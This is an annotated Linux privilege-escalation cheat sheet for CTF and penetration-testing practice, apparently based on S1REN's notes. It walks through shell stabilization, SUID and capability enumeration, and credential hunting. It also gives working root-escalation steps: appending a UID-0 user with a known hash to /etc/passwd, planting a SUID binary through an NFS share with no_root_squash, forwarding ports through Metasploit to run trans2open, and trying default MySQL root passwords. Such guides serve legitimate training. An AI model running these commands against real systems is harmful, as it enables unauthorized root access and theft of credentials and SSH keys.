
```
g0tmilk's Guide to Linux Privilege Escalation as well:
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```


https://ippsec.rocks

> Classic reference guide — read it once fully. Covers manual enumeration techniques that automated tools like LinPEAS can miss.

---

```
I just got a low-priv shell ! 
What would S1REN do right now?
python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

> Shell stabilization — a raw dumb shell breaks tab-complete, arrow keys, Ctrl+C. This sequence gives you a fully interactive TTY. Do this immediately or you risk killing your own connection with Ctrl+C. The stty columns/rows matches your terminal size so output doesn't wrap weirdly.

---

```
S1REN would say:
Various Capabilities?
which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which ncat
which nc.traditional
which socat
```

> Finding what tools exist on the box tells you how to transfer files, spawn shells, and compile exploits. If gcc exists you can compile local exploits. If nc/socat exist you can pivot or get reverse shells. If python/perl exist you can run scripts or upgrade your shell.

---

```
Compilation? (Very Back Burner)
file /bin/bash
uname -a
cat /etc/*-release
cat /etc/issue
```

> Before compiling a kernel exploit you need the exact architecture (32/64-bit) and OS version. Compiling for the wrong arch = broken binary. "Back burner" because kernel exploits are noisy/risky and should be a last resort.

---

```
What Arch?
file /bin/bash

Kernel?
uname -a

Issue/Release?
cat /etc/issue
cat /etc/*-release
```

> uname -a gives kernel version — search it on exploit-db for known kernel exploits (e.g. DirtyCow). The release files tell you the distro and version so you can look up CVEs specific to that OS.

---

```
Are we a real user?
sudo -l
ls -lsaht /etc/sudoers
```

> sudo -l lists what commands your current user can run as root without a password. This is one of the fastest priv esc paths — if you see NOPASSWD next to any binary, check GTFOBins immediately. /etc/sudoers may be readable and reveal even more rules.

---

```
Are any users a member of exotic groups?
groups <user>
```

> Certain groups give dangerous permissions: disk (read raw disk = read all files), docker (mount host fs = instant root), lxd (container escape to root), adm (read logs). If a user is in any of these, it's a priv esc vector.

---

```
Check out your shell's environment variables...
env
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
```

> Environment variables can leak credentials, API keys, or show a misconfigured PATH. A writable PATH directory means you can drop a malicious binary with the same name as one called by a root script — it'll run yours instead.

---

```
Users?
cd /home/
ls -lsaht
```

> Lists all user home directories. Look for readable directories — other users' .ssh folders, bash_history, config files with credentials, or notes left behind. Readable home dirs are common in CTFs.

---

```
Web Configs containing credentials?
cd /var/www/html/
ls -lsaht
```

> Web apps store DB credentials in config files (wp-config.php, config.php, .env, database.yml). These credentials are often reused for system users or MySQL root. Always grep for 'password' in web directories.

---

```
SUID Binaries?
```
```
find / -perm -u=s -type f 2>/dev/null`
```
```

GUID Binaries?
find / -perm -g=s -type f 2>/dev/null
```

> SUID binaries run as their owner (often root) regardless of who executes them. If a non-standard binary has SUID set, look it up on GTFOBins — many can be abused to read files, spawn shells, or write files as root. Compare output against a known-clean list to spot unusual ones.

---

```
SUID/GUID/SUDO Escalation:
https://gtfobins.github.io/
```

> GTFOBins is your bible for SUID/sudo abuse. Search the binary name, filter by SUID or Sudo — it gives you the exact command to run to escalate. Always check here before moving on.

---

```
Binary/Languages with "Effective Permitted" or "Empty Capability" (ep):
https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities
Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.
getcap -r / 2>/dev/null
```

> Capabilities are a finer-grained alternative to SUID. A binary with cap_setuid+ep can change its UID to 0 (root) — same impact as SUID but harder to spot. Python or perl with cap_setuid is an instant root shell. GTFOBins also covers capabilities.

---

```
We need to start monitoring the system if possible while performing our enumeration...
In other words:
"S1REN... Is privilege escalation going to come from some I/O file operations being done by some script on the system?"
https://github.com/DominicBreuker/pspy/blob/master/README.md
cd /var/tmp/
File Transfer --> pspy32
File Transfer --> pspy64
chmod 755 pspy32 pspy64
./pspy<32/64>
```

> pspy watches all running processes without needing root. It reveals cron jobs and scripts running as root that aren't visible in crontab. If a root script calls a file you can write to, or uses a relative path you can hijack, that's your escalation. Run it and watch for a minute or two — patterns repeat on a schedule.

---

```
What does the local network look like?
netstat -antup
netstat -tunlp
```

> Shows services listening on loopback (127.0.0.1) that aren't exposed externally. A vulnerable service running internally as root (old MySQL, Redis with no auth, custom app) can be exploited once you forward the port out. This is where port forwarding comes in.

---

```
Is anything vulnerable running as root?
ps aux |grep -i 'root' --color=auto
```

> Lists all processes running as root. Look for web servers, databases, custom scripts, or old software versions. If a root process is interacting with files you can write, or running a known vulnerable version, that's your attack surface.

---

```
MYSQL Credentials? Root Unauthorized Access?
mysql -uroot -p
Enter Password:
root : root
root : toor
root :  
```

> MySQL running as root with a blank or default password is common in CTFs. Once inside as root you can use SELECT INTO OUTFILE to write files anywhere on the filesystem — including a SUID shell or a new sudoers entry. Check web config files for credentials first.

---

```
S1REN would take a quick look at etc to see if any user-level people did special things:
cd /etc/
ls -lsaht
Anything other than root here?
• Any config files left behind?
→ ls -lsaht |grep -i '.conf' --color=auto

• If we have root priv information disclosure - are there any .secret in /etc/ files?
→ ls -lsaht |grep -i '.secret' --color=aut
```

> /etc/ is normally root-owned but misconfigurations leave world-readable or world-writable config files. Credentials in .conf files, or writable /etc/passwd and /etc/sudoers, are immediate wins. Non-root owned files here are a red flag.

---

```
SSH Keys I can use perhaps for even further compromise?
ls -lsaR /home/
```

> Look for .ssh/id_rsa (private keys) in other users' home directories. If readable, copy it and ssh in as that user — potentially root. Also check authorized_keys to see what keys are trusted, and known_hosts to discover other machines this box connects to.

---

```
Quick look in:
ls -lsaht /var/lib/
ls -lsaht /var/db/
```

> /var/lib/ stores application state data — databases, package manager data, docker state. Credentials or sensitive data for installed services often live here (e.g. /var/lib/mysql, /var/lib/postgresql).

---

```
Quick look in:
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
```

> /opt/ is where non-standard software is installed — often custom apps with weak permissions or hardcoded credentials. /tmp/, /var/tmp/, /dev/shm/ are world-writable and executable — use these to upload and run your tools. /var/tmp/ survives reboots, /tmp/ usually doesn't.

---

```
File Transfer Capability? What can I use to transfer files?
which wget
which curl
which nc
which fetch (BSD)
ls -lsaht /bin/ |grep -i 'ftp' --color=auto
```

> You need to transfer tools like pspy, LinPEAS, or compiled exploits to the target. wget/curl for HTTP downloads from your machine, nc for raw transfers, ftp if available. Host a Python HTTP server on your attack box (python3 -m http.server 80) and pull files down.

---

```
NFS? Can we exploit weak NFS Permissions?
cat /etc/exports
no_root_squash?
https://recipeforroot.com/attacking-nfs-shares/
[On Attacking Machine]
mkdir -p /mnt/nfs/
mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su <user id matching target machine's user-level privilege.>

[On Target Machine]
user@host$ ./suid
#
```

> no_root_squash means root on your attack machine is treated as root on the NFS share. Mount the share, compile a SUID binary, copy it with SUID bit set — then run it on the target as any user and get a root shell. Check /etc/exports for any share with no_root_squash.

---

```
Where can I live on this machine? Where can I read, write and execute files?
/var/tmp/
/tmp/
/dev/shm/
```

> These are your staging areas. Always work from here — they're writable and executable by any user. /dev/shm/ is in-memory so it leaves no disk trace. /var/tmp/ is best for persistence since it survives reboots.

---

```
Any exotic file system mounts/extended attributes?
cat /etc/fstab
```

> fstab reveals what file systems are mounted and with what options. Look for NFS mounts, weak permissions (world-writable), or credentials embedded in mount options. Also reveals network shares that might be reachable.

---

```
Forwarding out a weak service for root priv (with meterpreter!):
Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.
https://www.offensive-security.com/metasploit-unleashed/portfwd/

Forwarding out netbios-ssn EXAMPLE:
meterpreter> portfwd add –l 139 –p 139 –r [target remote host] 
meterpreter> background 
use exploit/linux/samba/trans2open
set RHOSTS 0.0.0.0
set RPORT 139
run
```

> Services bound to 127.0.0.1 are only accessible locally — but if vulnerable, you can exploit them by forwarding the port through your meterpreter session to your attack machine. netstat showed you what's listening internally; this is how you reach it. Run your exploit against localhost on your own box after forwarding.

---

```
Can we write as a low-privileged user to /etc/passwd?
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
su siren
id
```

> If /etc/passwd is world-writable (check: ls -la /etc/passwd), you can append a new root-level user with a known password. UID/GID 0:0 = root privileges. The openssl command generates the password hash. After appending, su to your new user and you're root.

---

```
Cron.
crontab –u root –l

Look for unusual system-wide cron jobs:
cat /etc/crontab
ls /etc/cron.*
```

> Cron jobs run on a schedule, often as root. If a root cron job calls a script or binary you can write to, replace it with a reverse shell or chmod +s /bin/bash. If it uses a wildcard (*) in a tar or rsync command, you can inject arguments. pspy will show you crons that don't appear in crontab output.

---

```
Bob is a user on this machine. What is every single file he has ever created?
find / -user bob 2>/dev/null
```

> Finds every file owned by a specific user across the whole filesystem. Useful when you've compromised one user and want to find everything they own — scripts, configs, data files — that might contain credentials or be writable by you for hijacking.

---

```
Any mail? mbox in User $HOME directory?
cd /var/mail/
cd /var/spool/mail/
ls -lsaht
```

> System mail often contains automated messages with credentials, error output from root cron jobs, or password reset tokens. Frequently overlooked. Check if any mail files are readable by your current user.

---

```
Linpease:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

Traitor:
https://github.com/liamg/traitor

GTFOBins:
https://gtfobins.github.io/

PSpy32/Pspy64:
https://github.com/DominicBreuker/pspy/blob/master/README.md
```

> Your automated toolkit. Run LinPEAS first for broad enumeration — it color-codes findings by severity. Traitor auto-exploits common misconfigurations. pspy for watching live process activity. GTFOBins for looking up specific binaries. LinPEAS output is long — focus on red/yellow highlighted sections first.
